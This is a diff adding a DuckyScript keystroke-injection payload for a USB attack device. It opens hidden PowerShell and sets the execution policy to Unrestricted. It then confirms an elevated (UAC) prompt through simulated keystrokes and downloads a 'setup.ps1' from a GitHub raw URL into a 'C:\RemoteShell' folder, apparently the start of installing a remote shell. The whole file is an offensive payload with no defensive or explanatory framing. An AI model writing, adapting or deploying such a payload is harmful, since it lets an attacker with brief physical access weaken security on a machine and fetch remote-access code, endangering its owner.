@@ -1,0 +1,21 @@
+DELAY 300
+GUI r
+DELAY 300
+STRING powershell -NoP -NonI -w h Set-ExecutionPolicy Unrestricted
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 500
+LEFTARROW
+DELAY 300
+ENTER
+
+DELAY 300
+GUI r
+DELAY 300
+STRING powershell -Command "& { $url = 'https://raw.githubusercontent.com/fiveraptor/rs/main/setup.ps1'; $zielSpeicherort = 'C:\RemoteShell\setup.ps1'; $webClient = New-Object System.Net.WebClient; $webClient.DownloadFile($url, $zielSpeicherort); }"
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 500
+LEFTARROW
+DELAY 300
+ENTER
